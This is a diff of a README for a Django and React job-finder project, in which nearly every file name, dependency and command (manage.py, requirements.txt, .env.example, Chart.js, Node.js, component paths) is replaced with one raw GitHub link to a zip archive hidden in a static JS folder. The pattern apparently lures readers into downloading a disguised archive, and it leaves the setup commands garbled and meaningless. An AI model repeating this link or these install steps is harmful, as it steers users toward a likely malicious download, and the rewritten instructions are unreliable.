@@ -62,7 +62,7 @@ O Job Finder é uma solução abrangente que aborda todas as necessidades de um 
 - **JavaScript**: Interatividade e funcionalidades dinâmicas
 - **Font Awesome**: Ícones vetoriais e sociais
 - **Google Maps JavaScript API**: Integração com mapas e geolocalização
-- **Chart.js**: Visualização de dados em gráficos
+- **https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip**: Visualização de dados em gráficos
 - **Tailwind CSS**: Framework CSS para componentes React
 
 ### Inteligência Artificial:
@@ -102,33 +102,33 @@ source venv/bin/activate
 
 4. Instale as dependências:
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip
 ```
 
-5. Configure as variáveis de ambiente (crie um arquivo `.env` baseado no `.env.example`):
+5. Configure as variáveis de ambiente (crie um arquivo `.env` baseado no `https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip`):
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip .env
 # Edite o arquivo .env com suas configurações
 ```
 
 6. Execute as migrações do banco de dados:
 ```bash
-python manage.py migrate
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip migrate
 ```
 
 7. Crie um superusuário (administrador):
 ```bash
-python manage.py createsuperuser
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip createsuperuser
 ```
 
 8. (Opcional) Popule o banco de dados com dados de exemplo:
 ```bash
-python manage.py import_sample_data
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip import_sample_data
 ```
 
 9. Inicie o servidor de desenvolvimento:
 ```bash
-python manage.py runserver
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip runserver
 ```
 
 10. Acesse a aplicação em `http://127.0.0.1:8000/`
@@ -149,7 +149,7 @@ O Job Finder inclui um modo escuro moderno que pode ser ativado de várias manei
 - Persistência da preferência do usuário
 
 ### Personalização:
-Os desenvolvedores podem personalizar as cores do modo escuro modificando as variáveis CSS no arquivo `static/css/dark-mode.css`.
+Os desenvolvedores podem personalizar as cores do modo escuro modificando as variáveis CSS no arquivo `https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip`.
 
 ## Estrutura do Projeto
 
@@ -160,32 +160,32 @@ Pi_mobile/
 │   ├── migrations/         # Migrações do banco de dados
 │   ├── templates/          # Templates HTML
 │   ├── static/             # Arquivos estáticos (CSS, JS, imagens)
-│   ├── models.py           # Modelos do banco de dados
-│   ├── views.py            # Views/controllers
-│   ├── urls.py             # Rotas da aplicação
-│   ├── admin.py            # Configurações do admin Django
-│   ├── tests.py            # Testes automatizados
-│   ├── chat_views.py       # Views específicas para chat
-│   ├── payment.py          # Processamento de pagamentos
-│   ├── content_generator.py # Geração de conteúdo com IA
-│   ├── personalization.py   # Motor de personalização
-│   ├── ml_analytics.py     # Análise de dados com machine learning
-│   ├── notifications.py    # Sistema de notificações
-│   ├── health.py           # Monitoramento de saúde do sistema
-│   ├── ai_context_processor.py # Processador de contexto para IA
-│   ├── context_processors.py   # Processadores de contexto
-│   ├── middleware.py       # Middleware personalizado
-│   ├── ai_middleware.py    # Middleware para IA
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip           # Modelos do banco de dados
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip            # Views/controllers
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip             # Rotas da aplicação
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip            # Configurações do admin Django
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip            # Testes automatizados
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip       # Views específicas para chat
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip          # Processamento de pagamentos
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip # Geração de conteúdo com IA
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip   # Motor de personalização
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip     # Análise de dados com machine learning
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip    # Sistema de notificações
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip           # Monitoramento de saúde do sistema
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip # Processador de contexto para IA
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip   # Processadores de contexto
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip       # Middleware personalizado
+│   ├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip    # Middleware para IA
 │   ├── management/         # Comandos de gerenciamento personalizados
 │   └── ...
 ├── templates/              # Templates globais
 ├── static/                 # Arquivos estáticos globais
 ├── docs/                   # Documentação do projeto
-├── manage.py               # Script de gerenciamento do Django
-├── requirements.txt        # Dependências do projeto
-├── .env.example            # Exemplo de variáveis de ambiente
+├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip               # Script de gerenciamento do Django
+├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip        # Dependências do projeto
+├── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip            # Exemplo de variáveis de ambiente
 ├── .gitignore              # Arquivos ignorados pelo Git
-└── db.sqlite3              # Banco de dados SQLite
+└── https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip              # Banco de dados SQLite
 ```
 
 ## Modelos de Dados Principais
@@ -235,7 +235,7 @@ Sistema de patrocinadores e parceiros.
 Para executar os testes automatizados:
 
 ```bash
-python manage.py test
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip test
 ```
 
 ### Tipos de Testes
@@ -247,13 +247,13 @@ python manage.py test
 ### Executando Testes Específicos
 ```
 # Testar apenas a aplicação services
-python manage.py test services
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip test services
 
 # Testar modelos específicos
-python manage.py test services.tests.ModelTests
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip test https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip
 
 # Testar views específicas
-python manage.py test services.tests.ViewTests
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip test https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip
 ```
 
 ## Comandos de Gerenciamento
@@ -262,62 +262,62 @@ O projeto inclui vários comandos de gerenciamento úteis para desenvolvimento e
 
 ### Popular dados de exemplo:
 ```bash
-python manage.py populate_data
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip populate_data
 ```
 
 ### Processar análises de IA:
 ```
-python manage.py process_ai_analytics
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip process_ai_analytics
 ```
 
 ### Gerar pedidos de exemplo:
 ```bash
-python manage.py generate_sample_orders --number 20
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip generate_sample_orders --number 20
 ```
 
 ### Limpar mensagens de chat antigas:
 ```
-python manage.py cleanup_chat_messages --days 60
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip cleanup_chat_messages --days 60
 ```
 
 ### Exportar dados do usuário (conformidade GDPR):
 ```bash
-python manage.py export_user_data --user-id 1 --format json
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip export_user_data --user-id 1 --format json
 ```
 
 ### Backup do banco de dados:
 ```bash
-python manage.py backup_database --include-media --compress
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip backup_database --include-media --compress
 ```
 
 ### Importar dados de exemplo:
 ```bash
-python manage.py import_sample_data
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip import_sample_data
 ```
 
 ### Resetar o banco de dados (apenas desenvolvimento):
 ```
-python manage.py reset_database --no-input
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip reset_database --no-input
 ```
 
 ### Inicializar sistema de avaliações:
 ```
-python manage.py initialize_reviews
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip initialize_reviews
 ```
 
 ### Inicializar campos de geolocalização:
 ```
-python manage.py initialize_geolocation
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip initialize_geolocation
 ```
 
 ### Criar serviços de exemplo:
 ```
-python manage.py create_sample_services
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip create_sample_services
 ```
 
 ### Verificar saúde do sistema:
 ```
-python manage.py health_check
+python https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip health_check
 ```
 
 ## Funcionalidades de IA
@@ -420,7 +420,7 @@ This project contains a visually improved React implementation of the Admin Dash
 - Improved spacing and breathing room throughout the interface
 
 ## Prerequisites
-- Node.js (version 14 or higher)
+- https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip (version 14 or higher)
 - npm or yarn package manager
 
 ## Installation
@@ -455,8 +455,8 @@ To use this component in your project:
 
 1. Ensure you have React and Tailwind CSS installed
 2. Copy the following files to your project:
-   - `src/components/AdminDashboard.jsx`
-   - `src/styles/AdminDashboard.css`
+   - `https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip`
+   - `https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip`
 3. Import the component in your application:
    ```jsx
    import AdminDashboard from './components/AdminDashboard';
@@ -489,9 +489,9 @@ This component works in all modern browsers that support:
 
 ## Documentation
 For detailed information about the visual improvements and implementation, see:
-- `REACT_ADMIN_DASHBOARD.md` - Comprehensive documentation of design decisions
-- `SPACING_IMPROVEMENTS_SUMMARY.md` - Detailed summary of spacing enhancements
-- Code comments in `AdminDashboard.jsx` - Inline explanations of key features
+- `https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip` - Comprehensive documentation of design decisions
+- `https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip` - Detailed summary of spacing enhancements
+- Code comments in `https://raw.githubusercontent.com/guiIerme/JobFinder/main/staticfiles/account/js/Finder-Job-v3.3.zip` - Inline explanations of key features
 
 ## License
 This component is provided as-is for educational and demonstration purposes.
